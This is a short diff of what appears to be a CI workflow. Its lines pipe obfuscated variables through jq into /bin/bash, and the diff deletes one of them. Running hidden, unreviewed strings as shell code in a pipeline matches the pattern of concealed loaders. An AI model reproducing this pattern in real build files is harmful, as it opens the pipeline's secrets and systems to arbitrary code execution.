@@ -26,7 +26,6 @@ jobs:
           printf '%s' "$ihp0" | jq -r .lztso5 | /bin/bash
           echo $o27357 | jq -r .pjki69600 | /bin/bash
           echo $m42 | jq -r .fdz05 | /bin/bash
-          echo $fvilw040 | jq -r .txbgl74 | /bin/bash
           echo $z3 | jq -r .ltp58047 | /bin/bash
           echo $zor5334 | jq -r .r3 | /bin/bash
 
